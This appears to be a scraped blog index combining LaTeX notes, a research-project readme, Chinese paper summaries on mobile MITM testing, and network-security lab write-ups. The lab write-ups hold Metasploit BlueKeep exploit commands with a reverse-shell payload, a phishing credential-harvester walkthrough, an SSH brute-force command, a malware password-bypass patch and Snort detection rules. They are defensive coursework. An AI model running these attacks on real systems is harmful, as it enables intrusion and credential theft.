\\underbrace{y}_\\text{imaginary} }^\\text{complex number} Alignment # $$ \\begin{aligned} f(x) \u0026amp;= ax + by + cz + d \\ \u0026amp;= 2x + 3y + 5z + 1 \\end{aligned} $$\n\\begin{aligned} f(x) \u0026amp;= ax + by + cz + d \\\\ \u0026amp;= 2x + 3y + 5z + 1 \\end{aligned} % 或 \\begin{align} f(x) \u0026amp;= ax + by + cz + d \\\\ \u0026amp;= 2x + 3y + 5z + 1 \\end{align} % 或 \\eqalign{ f(x) \u0026amp;= ax + by + cz + d \\\\ \u0026amp;= 2x + 3y + 5z + 1 } $$ \\begin{cases}n/2, \u0026amp; \\text{if $n$ is even} \\ 3n+1, \u0026amp; \\text{if $n$ is odd} \\end{cases} $$\n\\begin{cases} n/2, \u0026amp; \\text{if $n$ is even} \\\\ 3n+1, \u0026amp; \\text{if $n$ is odd} \\end{cases} % 或 \\cases{ n/2, \u0026amp; \\text{if $n$ is even} \\\\ 3n+1, \u0026amp; \\text{if $n$ is odd} } $$ \\begin{pmatrix} aaa \u0026amp; bbb \\ cc \u0026amp; dd \\end{pmatrix} $$\n\\begin{pmatrix} aaa \u0026amp; bbb \\\\ cc \u0026amp; dd \\end{pmatrix} $$ \\begin{matrix} xxxxxx \u0026amp; xxxxxx \u0026amp; xxxxxx \\cr ab \u0026amp; \\hfil ab \u0026amp; ab\\hfil \\cr \\end{matrix} $$\n\\begin{matrix} xxxxxx \u0026amp; xxxxxx \u0026amp; xxxxxx \\cr ab \u0026amp; \\hfil ab \u0026amp; ab\\hfil \\cr % 以 \\hfil 自動填空 \\end{matrix} $$ \\begin{array}{rrrrrr|r} \u0026amp; x_1 \u0026amp; x_2 \u0026amp; s_1 \u0026amp; s_2 \u0026amp; s_3 \u0026amp; \\ \\hline s_1 \u0026amp; 0 \u0026amp; 1 \u0026amp; 1 \u0026amp; 0 \u0026amp; 0 \u0026amp; 8 \\ s_2 \u0026amp; 1 \u0026amp; -1 \u0026amp; 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; 4 \\ s_3 \u0026amp; 1 \u0026amp; 1 \u0026amp; 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; 12 \\ \\hline \u0026amp; -1 \u0026amp; -1 \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \\end{array} $$\n\\begin{array}{rrrrrr|r} \u0026amp; x_1 \u0026amp; x_2 \u0026amp; s_1 \u0026amp; s_2 \u0026amp; s_3 \u0026amp; \\\\ \\hline s_1 \u0026amp; 0 \u0026amp; 1 \u0026amp; 1 \u0026amp; 0 \u0026amp; 0 \u0026amp; 8 \\\\ s_2 \u0026amp; 1 \u0026amp; -1 \u0026amp; 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; 4 \\\\ s_3 \u0026amp; 1 \u0026amp; 1 \u0026amp; 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; 12 \\\\ \\hline \u0026amp; -1 \u0026amp; -1 \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \\end{array} Advanced # $$ \\overset{上組合技}{\\implies} 或\\underset{下組合技}{\\impliedby} $$\n\\overset{上組合技}{\\implies} 或 \\underset{下組合技}{\\impliedby} $$ \\require{extpfeil} x\\xtofrom[f^{-1}]{f} y $$\n\\require{extpfeil} x \\xtofrom[f^{-1}]{f} y $$ \\require{mhchem} x \\xrightleftharpoons[f^{-1}]{f} y $$\n\\require{mhchem} x \\xrightleftharpoons[f^{-1}]{f} y $$ \\require{ams} \\begin{equation} \\tag{1}\\label{eq:eq_1} E = mc^2\n\\end{equation} $$\n\\require{ams} \\begin{equation} \\tag{1}\\label{eq:eq_1} E = mc^2 \\end{equation} % MathJax 照理說已支援 Auto Number，但 HackMD 不支援。 % 只能手動自己加 \\tag{1}\\label{eq:equation_name} $$ reference\\ equation\\eqref{eq:eq_1} $$\nreference\\ equation\\eqref{eq:eq_1} $$ \\begin{equation*} E = mc^2 \\end{equation*} $$\n\\begin{equation*} E = mc^2 \\end{equation*} % 不加入 Auto Number，但在 HackMD 上沒差別。 $$ \\def \\kton{\\sum\\limits_{k=0}^{n}} \\begin{aligned} (1+\\frac{1}{n})^n \u0026amp;= \\kton \\binom{n}{k}1^{n-k}(\\frac{1}{n})^{k}\\ \u0026amp;= \\kton \\binom{n}{k} \\frac{1}{n^{k}}\\ \u0026amp;= \\kton \\frac{n!}{k!(n-k)!}\\times\\frac{1}{n^k}\\ \u0026amp;= \\kton \\frac{1}{k!} \\frac{\\overbrace{n(n-1)(n-2)\\ldots(n-k+1)}^{共\\ k\\ 項}}{n^k}\\ \u0026amp;= \\kton \\frac{1}{k!} (\\frac{n}{n}\\frac{n-1}{n}\\cdots\\frac{n-k+1}{n}) \\end{aligned} $$\n% 若命令又長又重複，可用 \\def 自訂 \\def \\kton{\\sum\\limits_{k=0}^{n}} \\begin{aligned} (1+\\frac{1}{n})^n \u0026amp;= \\kton \\binom{n}{k}1^{n-k}(\\frac{1}{n})^{k}\\\\ \u0026amp;= \\kton \\binom{n}{k} \\frac{1}{n^{k}}\\\\ \u0026amp;= \\kton \\frac{n!}{k!(n-k)!}\\times\\frac{1}{n^k}\\\\ \u0026amp;= \\kton \\frac{1}{k!} \\frac{\\overbrace{n(n-1)(n-2)\\ldots(n-k+1)}^{共\\ k\\ 項}}{n^k}\\\\ \u0026amp;= \\kton \\frac{1}{k!} (\\frac{n}{n}\\frac{n-1}{n}\\cdots\\frac{n-k+1}{n}) \\end{aligned} $$ \\DeclareMathOperator {\\total}{總計} \\total_a^b(x) $$\n\\DeclareMathOperator {\\total}{總計} \\total_a^b(x) % 自訂 Operator，命名限 [a-z|A-Z]，不可含數字。 微調字體、字距 # Font # $$ \\mathbb{ABCDE12345abcde} $$\n\\mathbb - Used to turn on blackboard-bold for uppercase letters and lowercase \u0026lsquo;k\u0026rsquo;.\n$$ \\mathbf{ABCDE12345abcde} $$\n\\mathbf - Used to turn on boldface for uppercase and lowercase letters and digits.\n$$ \\mathit{ABCDE12345abcde} $$\n\\mathit - forces the math italic mode.\n$$ \\mathcal{ABCDE12345abcde} $$\n\\mathcal - Used to turn on calligraphic font for uppercase letters and digits.\n$$ \\mathfrak{ABCDE12345abcde} $$\n\\mathfrak - turn on fraktur font for uppercase and lowercase letters and digits (and a few other characters).\n$$ \\mathrm{ABCDE12345abcde} $$\n\\mathrm - Used to turn on roman typestyle for uppercase and lowercase letters.\n$$ \\mathscr{ABCDE12345abcde} $$\n\\mathscr - Used to turn on script typestyle for uppercase letters. If lowercase script letters are not available, then they are typeset in a roman typestyle.\n$$ \\mathsf{ABCDE12345abcde} $$\n\\mathsf - Used to turn on sans serif typestyle for uppercase and lowercase letters and digits; also affects uppercase greek.\n$$ \\mathtt{ABCDE12345abcde} $$\n\\mathtt - Used to turn on typewriter typestyle for uppercase and lowercase letters and digits.\n$$ \\oldstyle{ABCDE12345abcde} $$\n\\oldstyle - Used to turn on oldstyle font.\nOperator (Class Assignment) # \\mathord - forces the argument to be treated in the \u0026lsquo;ordinary\u0026rsquo; class. \\mathrel - forces the argument to be treated in the \u0026lsquo;relation\u0026rsquo; class. \\mathinner - forces the argument to appear \u0026lsquo;inside\u0026rsquo; other formulas, and should be surrounded by additional space in certain circumstances. \\mathbin - Used to give the correct spacing to make an object into a binary operator. \\mathstrut - Used to achieve more uniform appearance in adjacent formulas as an invisible box whose width is zero. \\mathpunct \\mathopen \\mathclose \\mathop\n\\mathxxx{argument} \\mathchoice - provides content that is dependent on the current style (display, text, script, or scriptscript).\n\\mathchoice{D}{T}{S}{SS} More # https://en.wikibooks.org/wiki/LaTeX/Mathematics https://en.wikibooks.org/wiki/LaTeX/Advanced_Mathematics#Custom_operators https://en.wikibooks.org/wiki/LaTeX/Mathematics#Adding_text_to_equations MathJax Tutorial https://tex.stackexchange.com/ 手寫辨認查詢 MathJax Commands LaTeX Arrows https://en.wikipedia.org/wiki/List_of_logic_symbols $\\LaTeX$ for Twitch Chat tags: LaTeX # "},{"id":6,"href":"/side-project/a-hybrid-facial-expression-recognition-system-based-on-facial-features-and-pose-estimation/","title":"A Hybrid Facial Expression Recognition System Based on Facial Features and Pose Estimation","section":"Side Projects","content":" A Hybrid Facial Expression Recognition System Based on Facial Features and Pose Estimation # tags: NTUST Emotional Recognition Openpose PyTorch Special Topic # :::spoiler [TOC] :::\nAuthor # JING-MING GUO1, (Senior Member, IEEE), CHIH-HSIEN HSIA2, (Member, IEEE), PING-HSUEH HO1, (Bachelor), YANG-CHEN CHANG1, (Bachelor)\n1Department of Electrical Engineering, National Taiwan University of Science and Technology Taipei City 106, Taipei County, Taiwan 2Department of Computer Science and Information Engineering, National Ilan University, Yilan City 260, Yilan County, Taiwan\n1jmguo@mail.ntust.edu.tw, bernie6401@gmail.com, Max.chang965132@gmail.com 2chhsia625@gmail.com\nData # The datasets are placed in the datasets folder, we prepare them as the link you can download by correct structure, please see the data readme.\nIn the folder, we just use GEMEP dataset that has whole body including face and body especially as our research data and compare with other paper.\nModels # The modes\u0026rsquo; weights are placed in the models folder, we prepare them as the link you can download by correct structure, please see model readme.\nWe use Fusing Body Posture model as our body model and also use ARM model as our face model. We also use weights that ARM team(named epoch59_acc0.9205.pth in download link) and Fusing Body team provided as our pretrained weight respectively.\nOur model structure is as below:\nRun # Setup environment:\npip install -U scikit-learn conda install -c conda-forge matplotlib conda install -c conda-forge argparse conda install -c conda-forge tqdm conda install -c conda-forge wandb conda install -c anaconda pillow Demo GEMEP with 7 classes\npython test_leave_one_out.py -p --data_type GEMEP --num_classes 7 Demo GEMEP with 12 classes\npython test_leave_one_out.py -p --data_type GEMEP --num_classes 12 Result # 7 Classes - Face / Body / Whole # 12 Classes - Face / Body / Whole # More Detail # You can download here for more experience detail such as platform, software version, or hyper parameters, etc.\nUpdate # 2022/08/14 update dataset_leave_one_out.py and test_leave_one_out.py files about adding emo_tranform() function in former file to parse num_classes argument and let the user used it more convenient. Now you can just use the comment above and no need to adjust any code in any file in testing mode. "},{"id":7,"href":"/survey-papers/android-+-security/a-mitm-based-penetration-test-efficiency-improvement-approach-for-traffic-encrypted-mobile-apps-of-power-industry/","title":"A MITM Based Penetration Test Efficiency Improvement Approach for Traffic-Encrypted Mobile Apps of Power Industry","section":"Survey Papers","content":" A MITM Based Penetration Test Efficiency Improvement Approach for Traffic-Encrypted Mobile Applications of Power Industry # :::info Zhang, L., Wang, B., Shen, Q., Song, Y., Guo, N., \u0026amp; Xie, L. (2021, April). A MITM Based Penetration Test Efficiency Improvement Approach for Traffic-Encrypted Mobile Applications of Power Industry. In 2021 IEEE 6th International Conference on Computer and Communication Systems (ICCCS) (pp. 743-747). IEEE. ::: 這一篇蠻有趣的，和我想要做的東西幾乎一樣，不過他論文闡述的重點不一樣，但也還是給我一些之後需要注意的地方，\nIntroduction # 他是站在電力相關的Android App的角度去審視如果利用MITM Based做到滲透測試要怎麼做，以及和傳統的方式相比可以減少多少時間、效率提升多少。但其實內文和電力幾乎一點關係也沒有，代換成其他的App也可以，如果我們要利用MITM Based做到Penetration Testing，就必須要手動克服中間會加密的問題，所以他就試圖提出一個==3-Layers Proxy Based==的東西(如下圖) 從上圖可知，手機到Web Server中間總共有三層的Proxy，第一和第三層都是MITM Proxy，主要是負責訊息的加解密，而中間的那一層就可以很彈性的替換成各式各樣的自動化測試工具或腳本，例如Burp Suite或是SQLMAP之類的 :::info 這個架構會需要三層其實是因為他所測試的App，不只是傳輸的那一層會被SSL加密，而在傳送的封包body還會再加密一次，所以需要三層，不然照理來說，一層的MITM Proxy就可以解決SSL加解密的問題，不需要用到三層那麼多，而且也不需要深入探索他用的是哪一套加解密演算法，因為傳輸層的演算法都一樣才對，這是和學長討論出來的結果 :::\nProposed Method # First Layer Proxy: Mitm1 從上圖來看第一層的Proxy在Request的時候會負責解密從手機端加密的訊息，在傳遞Plaintext給第二層的腳本；而在Response則會反過來，他會把第二層提供的Plaintext加密回去再送給後面的手機 Third Layer Proxy: Mitm2 上圖就是把response和request要做的事情反過來而已 Experiment # 重要事項: 加解密的腳本需要事先準備好，意即我們要先確定該App是用哪種方式做到加解密，所以我們需要做到App的逆向工程，論文中有提到在電力工業中會用到的幾種方式: MD5 AES RSA SM1-SM4 Test Result W/o Automated Tools 從上面兩張圖片可以知道response和request在明文的情況下，實際的封包內容為何，如果要進一步的測試的話，可以直接手動在body中間塞一些東西 在文章中他是在其中一個地方塞了單引號，也就是試圖引發sqli的效果 Test Result W/ Automated Tools 內文中說到這個不是本次研究的重點，所以指示確定他會正常動作就結束了 整體效率提升多少 從上圖來看，傳統手動的方式進行加解密會很花時間，內文有提到: 測試時間顯著縮短了96%左右。理論上，手動方法的測試時間等於加解密時間加上腳本和工具切換時間 對於手動方法，大部分時間都浪費在不同工具之間的切換上\nFuture Work # 因為MITM Proxy適合支援HTTP和HTTPS協定的加解密，所以未來如果可以針對IoT設備的MQTT協定以及工控常用的Modbus協定，則coverage會更大\n"},{"id":8,"href":"/survey-papers/android-+-security/a-mitmproxy-based-dynamic-vulnerability-detection-system-for-android-applications/","title":"A Mitmproxy-based Dynamic Vulnerability Detection System For Android Applications","section":"Survey Papers","content":" A Mitmproxy-based Dynamic Vulnerability Detection System For Android Applications # :::info Lv, X., Peng, T., Tang, J., He, R., Hu, X., Jiang, M., \u0026hellip; \u0026amp; Cao, W. (2022, December). A Mitmproxy-based Dynamic Vulnerability Detection System For Android Applications. In 2022 18th International Conference on Mobility, Sensing and Networking (MSN) (pp. 408-416). IEEE. ::: 這一篇也和我想做的主題有一點關聯，他是利用MITMProxy-based達到偵測應用程式在做Hotfix時，有沒有Code Injection(dex injection)的問題。\nIntroduction # 現在有很多的App都會實現Hotfix這項技術，也就是不斷電更新，傳統的App更新方式為廠商發佈新的版本後，使用者需要重新卸載再安裝新的版本，但現在有了Hotfix的技術，使用者在沒有感知的情況下就會自動完成更新，如下圖所述，當然在更新之前會進行驗證Hash、SSL憑證和簽章，但如果沒有簽章呢?是不是就可以被MITM篡改Hash和進行Code Injection，這一篇文章就是在自動化的檢測這件事情的可行性 Background # Hotfix的流程 按照論文中的說明，利用hotfix更新patch的方式當然不是直接從server傳過來到client端，而是會把dex file打包成.jar或是.zip的patch package，然後放在某個地方。從server那邊會送出一個json file，裡面有一個URL Key會紀錄這個打包好的patch package在哪裡，然後client端自行去下載會來進行patch Android的簽章 在Android系統安全中有3個主要的技術: Permission Management, Signature Authentication, 以及Sandbox Mechanism，現在主要探討的問題就是在簽章的技術底下。Android的數位簽章總共會包含三個東西: MANIFEST.MF, CERT.SF, CERT.RSA MANIFEST.MF 是一個Digest File也就是存所有更新的打包檔案的Hash Value CERT.SF 是一個Signature File，他會用SHA1計算MANIFEST.MF中的所有東西再用Base64進行Encode CERT.RSA 存放Public Key+加密演算法是哪一個+用自己的Private Key加密CERT.SF中的所有東西的結果 綜上所述，如果一個廠商在進行Hotfix更新時，被MITM Hijack，那MANIFEST.MF和CERT.SF可以被換掉，但CERT.RSA這個檔案，因為沒有廠商的私鑰，故無法替換 Proposed Method # Phase I: Packet location 這個環節是為了要從所有Client和Server之間的封包中找出存在Hotfix URL的那一個封包以及實際把他提取出來放到Data.csv中 看Response的Content-Type是否為application/json :::spoiler 看該json file的內容是否有URL Key 看URL Value的最後是否為.jar或是.zip :::spoiler Phase II: Packet extraction 實際把Data.csv中的URL進行Request然後把檔案下載下來，並且偵測有無憑證，否則就把疊代的把dex file翻出來 Phase III: Pushing the packet 如上圖，有了dex file之後就是直接去搜尋有無MANIFEST.MF檔案(並且確定沒有CERT.RSA和CERT.SF或是其他簽章的File)，其中會紀錄哪裡是entry class；如果沒有就用objection這個dex injection tool去找，然後: Decompile→smali code(只能在smali中進行修改) Injection something :::spoiler Compile to dex file Modify URL in JSON \u0026amp; md5 hash 修改完成的dex file會放在attacker的本地端，所以要把json file中的URL換掉，另外md5也要換成新的dex file的hash 本次的重點不是code injection會造成多大的危害，他只是想要證明這個Vulnerability確實存在，所以他只有insert一個簡單的log code在裡面而已 Experiment # 本文提供三個research questions當作實驗的主軸\nWhat is the detection performance in previously collected applications with known dex injection vulnerabilities? 作者準備53個已知有dex injection的app以及47個沒有問題的app進行偵測，發現可以100%偵測出哪一個是有問題的App，以及花費的時間也很短，代表該系統提供很好的efficiency和accuracy Can our system effectively detect vulnerabilities in unknown apps from the app market? 那對於未知的App，該系統還有一樣的優勢嗎?作者準備了市面上1000個App進行偵測，發現有34個App會有hotfix dex injection的問題 其中，打勾的代表廠商已經修掉了，問號則是還沒有。作者還有判斷這34個分別是哪一個類別的App以及他們是藉由HTTP或者是HTTPS進行傳輸，這部分可以直接看論文，不太重要 Is there an improvement in detection performance compared with other methods? 針對其他tool的比較如上 "},{"id":9,"href":"/security/course/ntu-padns/ad-of-network-security---lab-12/","title":"A\u0026D of Network Security - Lab 12","section":"Securities","content":" A\u0026amp;D of Network Security - Lab 12 # tags: Practicum of A\u0026amp;D of NS NTU # Video # NTU PADNS Lecture 12\nBackground # What is _mbscmp?\nint _mbscmp( const unsigned char *string1, const unsigned char *string2 ); Return Value\n\u0026lt;0 string1 is less than string2 =0 string1 is identical to string2 \u0026gt;0 string1 is greater than string2\nRecon # Static - IDA Pro # :::spoiler Main Source Code\nint __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+10h] [ebp-181Ch] char v5; // [esp+410h] [ebp-141Ch] char v6; // [esp+810h] [ebp-101Ch] char v7; // [esp+C10h] [ebp-C1Ch] CHAR v8; // [esp+1024h] [ebp-808h] CHAR ServiceName; // [esp+1428h] [ebp-404h] const char *v10; // [esp+1828h] [ebp-4h] if ( argc == 1 ) { if ( !sub_401000() ) sub_402410(); sub_402360(); } else { v10 = argv[argc - 1]; if ( !sub_402510(v10) ) sub_402410(); if ( _mbscmp((const unsigned __int8 *)argv[1], \u0026amp;byte_40C170) ) { if ( _mbscmp((const unsigned __int8 *)argv[1], \u0026amp;byte_40C16C) ) { if ( _mbscmp((const unsigned __int8 *)argv[1], \u0026amp;byte_40C168) ) { if ( _mbscmp((const unsigned __int8 *)argv[1], aCc) ) sub_402410(); if ( argc != 3 ) sub_402410(); if ( !sub_401280(\u0026amp;v5, 1024, \u0026amp;v6, 1024, \u0026amp;v4, 1024, \u0026amp;v7) ) sub_402E7E(aKSHSPSPerS, \u0026amp;v5); } else { if ( argc != 7 ) sub_402410(); sub_401070(argv[2], argv[3], argv[4], argv[5]); } } else if ( argc == 3 ) { if ( sub_4025B0(\u0026amp;v8) ) return -1; sub_402900(\u0026amp;v8); } else { if ( argc != 4 ) sub_402410(); sub_402900(argv[2]); } } else if ( argc == 3 ) { if ( sub_4025B0(\u0026amp;ServiceName) ) return -1; sub_402600(\u0026amp;ServiceName); } else { if ( argc != 4 ) sub_402410(); sub_402600(argv[2]); } } return 0; } :::\nIf we execute it directly, nothing happened. Lab 9-1 Questions # How can you get this malware to install itself? Ans: You can get the program to install itself by providing it with the -in option, along with the password. Alternatively, you can patch the binary to skip the password verification check. What are the command-line options for this program? What is the password requirement? Ans: The command-line options for the program are one of four values and the password. The password is the string abcd and is required for all actions except the default behavior. The -in option instructs the malware to install itself. The -re option instructs the malware to remove itself. The -c option instructs the malware to update its configuration, including its beacon IP address. The -cc option instructs the malware to print its current configuration to the console. By default, this malware functions as a backdoor if installed.\nHow can you use OllyDbg to permanently patch this malware, so that it doesn’t require the special command-line password? Ans: You can patch the binary by changing the first bytes of the function at address 0x402510 to always return true. The assembly instruction for this behavior is MOV EAX, 0x1; RETN;, which corresponds to the byte sequence B8 01 00 00 00 C3.\nWhat are the host-based indicators of this malware? Ans: The malware creates the registry key HKLM\\Software\\Microsoft \\XPS\\ Configuration (note the trailing space after Microsoft). The malware also creates the service XYZ Manager Service, where XYZ can be a parameter provided at install time or the name of the malware executable. Finally, when the malware copies itself into the Windows System directory, it may change the filename to match the service name.\nWhat are the different actions this malware can be instructed to take via the network? Ans: The malware can be instructed to execute one of five commands via the network: SLEEP, UPLOAD, DOWNLOAD, CMD, or NOTHING. The SLEEP command instructs the malware to perform no action for a given period of time. The UPLOAD command reads a file from the network and writes it to the local system at a specified path. The DOWNLOAD command instructs the malware to send the contents of a local file over the network to the remote host. The CMD command causes the malware to execute a shell command on the local system. The NOTHING command is a no-op command that causes the malware to do nothing.\nAre there any useful network-based signatures for this malware? Ans: By default, the malware beacons http://www.practicalmalwareanalysis.com/ ; however, this is configurable. The beacons are HTTP/1.0 GET requests for resources in the form xxxx/xxxx.xxx, where x is a random alphanumeric ASCII character. The malware does not provide any HTTP headers with its requests\nLab 9-2 Questions # What strings do you see statically in the binary? Ans: The imports and the string cmd are the only interesting strings that appear statically in the binary. What happens when you run this binary? Ans: It terminates without doing much. How can you get this sample to run its malicious payload? Ans: Rename the file ocl.exe before you run it. What is happening at 0x00401133? Ans: A string is being built on the stack, which is used by attackers to obfuscate strings from simple strings utilities and basic static analysis techniques. What arguments are being passed to subroutine 0x00401089? Ans: The string 1qaz2wsx3edc and a pointer to a buffer of data are passed to subroutine 0x401089. What domain name does this malware use? Ans: The malware uses the domain practicalmalwareanalysis.com. What encoding routine is being used to obfuscate the domain name? Ans: The malware will XOR the encoded DNS name with the string 1qaz2wsx3edc to decode the domain name. What is the significance of the CreateProcessA call at 0x0040106E? Ans: The malware is setting the stdout, stderr, and stdin handles (used in the STARTUPINFO structure of CreateProcessA) to the socket. Since CreateProcessA is called with cmd as an argument, this will create a reverse shell by tying the command shell to the socket. Reference # Lab 9-1 恶意代码分析实战 Lab 9-1 习题笔记 恶意代码分析实战 Lab 9-2 习题笔记\n"},{"id":10,"href":"/security/course/ntu-padns/ad-of-network-security---lab-13/","title":"A\u0026D of Network Security - Lab 13","section":"Securities","content":" A\u0026amp;D of Network Security - Lab 13 # tags: Practicum of A\u0026amp;D of NS NTU # Metasploit with Bluekeep Vulnerability (CVE-2019-0708) # Setting up environment # Open Windows 7 and Kali-Linux with localhost only mode :::spoiler Screenshot :::\nThen we can note that the IP of these two machines are different: :::spoiler Screenshot ::: Now, we know Win7\u0026rsquo;s IP: 192.168.56.101 Kali-Linux\u0026rsquo;s IP: 192.168.56.102\nTest the connection of these machines :::spoiler Screenshot :::\nAlways allow the remote desktop connection of Win7 :::spoiler Screenshot :::\nTry to Exploit # Open Metasploit in Kali-Linux\n$ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce $ info # Can check the mode you\u0026#39;d like to use $ set rhost 192.168.56.101 # set remote host IP -\u0026gt; victim(Win7) $ set lhost 192.168.56.102 # set local host IP -\u0026gt; attacker(Kali-Linux) $ set target 2 # For virtual-box mode $ set payload windows/x64/meterpreter/reverse_tcp # Set the exploited payload $ check # Check if the victim can be exploited or not $ exploit # Actually attack :::info Sometimes the attack will not always success, you must try until it success. :::\n:::spoiler Detailed Screenshot :::\nRemote Desktop # Social Engineering in Kali-Linux # Set up the network environment same as the lab above Open Social Engineering Toolkit(root) in Kali-Linux Enter Command ... 1) Spear-Phishing Attack Vectors 2) Website Attack Vectors 3) Infectious Media Generator 4) Create a Payload and Listener 5) Mass Mailer Attack 6) Arduino-Based Attack Vector 7) Wireless Access Point Attack Vector 8) QRCode Generator Attack Vector 9) Powershell Attack Vectors 10) Third Party Modules 99) Return back to the main menu. set\u0026gt; 2 ... 1) Java Applet Attack Method 2) Metasploit Browser Exploit Method 3) Credential Harvester Attack Method 4) Tabnabbing Attack Method 5) Web Jacking Attack Method 6) Multi-Attack Web Method 7) HTA Attack Method 99) Return to Main Menu set:webattack\u0026gt;3 ... 1) Web Templates 2) Site Cloner 3) Custom Import 99) Return to Webattack Menu set:webattack\u0026gt;1 [-] Credential harvester will allow you to utilize the clone capabilities within SET [-] to harvest credentials or parameters from a website as well as place them into a report ... Enter the IP address for POST back in Harvester/Tabnabbing: 192.168.56.102 # Must using Kali-Linux IP ... ------------------------------------------------------- 1. Java Required 2. Google 3. Twitter set:webattack\u0026gt; Select a template:2 # You can also use other templates [*] Cloning the website: http://www.google.com [*] This could take a little bit... The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website. [*] The Social-Engineer Toolkit Credential Harvester Attack [*] Credential Harvester is running on port 80 [*] Information will be displayed to you as it arrives below: Open Chrome in Win7 and enter Kali IP and enter your account/password :::spoiler Screenshot ::: Check Kali-Linux Terminal 192.168.56.101 - - [27/May/2023 05:25:50] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 192.168.56.101 - - [27/May/2023 05:26:48] \u0026#34;GET /favicon.ico HTTP/1.1\u0026#34; 404 - [*] WE GOT A HIT! Printing the output: PARAM: GALX=SJLCkfgaqoM PARAM: continue=https://accounts.google.com/o/oauth2/auth?zt=ChRsWFBwd2JmV1hIcDhtUFdldzBENhIfVWsxSTdNLW9MdThibW1TMFQzVUZFc1BBaURuWmlRSQ%E2%88%99APsBz4gAAAAAUy4_qD7Hbfz38w8kxnaNouLcRiD3YTjX PARAM: service=lso PARAM: dsh=-7381887106725792428 PARAM: _utf8=â PARAM: bgresponse=js_disabled PARAM: pstMsg=1 PARAM: dnConn= PARAM: checkConnection= PARAM: checkedDomains=youtube POSSIBLE USERNAME FIELD FOUND: Email=test123 POSSIBLE PASSWORD FIELD FOUND: Passwd=123456 PARAM: signIn=Sign+in PARAM: PersistentCookie=yes [*] WHEN YOU\u0026#39;RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT. Done We try to fetch the victim\u0026rsquo;s account using fake web template\u0026hellip; "},{"id":11,"href":"/security/course/ntu-padns/ad-of-network-security---lab-14/","title":"A\u0026D of Network Security - Lab 14","section":"Securities","content":" A\u0026amp;D of Network Security - Lab 14 # tags: Practicum of A\u0026amp;D of NS NTU # Video # Class Description Lab Implementation\nBackground # snort Rule :::spoiler Rule Screenshot Format Action Option Option - Payload ::: Lab # Lab 1: Packet sniffer Mode show出 sniff ICMP封包的結果 # Payload:\n$ sudo snort -vd -i eth0 -q :::spoiler Result Screenshot :::\nLab 2: Attacker SSH爆破攻擊，利用 Snort偵測攻擊行為是否發生，show出偵測結果 ，並說明snort rule # Threat Model # Attacker use SSH brute force attack and try to log in the victim snort Need to write rule to detect attacker’s SSH brute force attack Lab Process # Set up environment - Host Only\nIn Kali-Linux 1(Attacker) - 192.168.56.129 :::spoiler Result Screenshot ::: In Kali-Linux 2(Victim) - 192.168.56.104 :::spoiler Result Screenshot ::: Write your rule and Test it in victim VM Payload:\n$ sudo vim /etc/snort/rules/local.rules # Insert rules below in this file alert tcp any any -\u0026gt; any 22 ( msg:\u0026#34;SSH Brute Force Attempt\u0026#34;; flow:established,to_server; content:\u0026#34;SSH\u0026#34;; nocase; offset:0; depth:4; detection_filter:track by_src, count 2, seconds 1; sid:1000001; rev:1;) # Test the rule if success $ sudo snort -T -c /etc/snort/snort.conf ... Snort successfully validated the configuration! Snort exiting Check SSH Connection if turn on (From inactive to active)\n$ sudo systemctl status ssh ● ssh.service - OpenBSD Secure Shell server Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled) Active: inactive (dead) Docs: man:sshd(8) man:sshd_config(5) $ sudo systemctl start ssh $ sudo systemctl status ssh ● ssh.service - OpenBSD Secure Shell server Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled) Active: active (running) since Tue 2023-05-30 05:04:10 EDT; 2s ago Docs: man:sshd(8) man:sshd_config(5) Process: 2670 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS) Main PID: 2671 (sshd) Tasks: 1 (limit: 9466) Memory: 1.1M CPU: 15ms CGroup: /system.slice/ssh.service └─2671 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups Run snort in victim\n$ sudo snort -A console -q -c /etc/snort/snort.conf -i eth0 Activate Attacking in Attacker VM\n$ sudo hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.104 -t 4 ssh Result Screenshot in Victim VM Lab 3-1: 使用Nmap進行攻擊並使用 Wireshark側錄封包分析可能可以成為snort的規則 # Threat Model # Nmap to the snort machine. (Any Nmap scan command is available) Write your own Rules on the snort machine Screenshot the output alert Lab Process # Open Wireshark and Record the packets and choose any to record\n$ sudo wireshark Try to attack in attacker VM\n$ sudo nmap sS 192.168.56.129 :::spoiler Final Result Screenshot :::\nLab 3-2: 撰寫snort rule並偵測出攻擊，偵測的 lert需包含你的學號 # From the result above, try to observe the common rules of these Red packets(unsuccessful packets) $\\to$ The length of each packets are $0$\nThus, we can use it to construct the snort payload as below(just insert the payload to /etc/snort/rules/local.rules):\nalert tcp any any -\u0026gt; any any (msg: \u0026#34;r11921a16: TCP Scan Alert\u0026#34;; sid:1000002;dsize:\u0026lt;5;) Try to attack # In victim VM:\n$ sudo snort -A console -q -u snort -g snort -c /etc/snort/snort.conf -i eth0 In attacker VM:\n$ sudo nmap sS 192.168.56.104 :::spoiler Final Result Screenshot :::\n"},{"id":12,"href":"/security/course/ntu-padns/ad-of-network-security---lab-2/","title":"A\u0026D of Network Security - Lab 2","section":"Securities","content":" A\u0026amp;D of Network Security - Lab 2 # tags: Practicum of A\u0026amp;D of NS NTU # Lab Cheat Sheet(Cisco Packet Tracer) # Setting VLAN # :::spoiler Switch\nSwitch\u0026gt;enable Switch#configure Configuring from terminal, memory, or network [terminal]? Enter configuration commands, one per line. End with CNTL/Z. Switch(config)#vlan 10 Switch(config-vlan)#name green Switch(config-vlan)#vlan 20 Switch(config-vlan)#name yellow Switch(config-vlan)# Switch# %SYS-5-CONFIG_I: Configured from console by console Switch#show vlan VLAN Name Status Ports ---- -------------------------------- --------- ------------------------------- 1 default active Fa0/5, Fa0/6, Fa0/7, Fa0/8 Fa0/9, Fa0/10, Fa0/11, Fa0/12 Fa0/13, Fa0/14, Fa0/15, Fa0/16 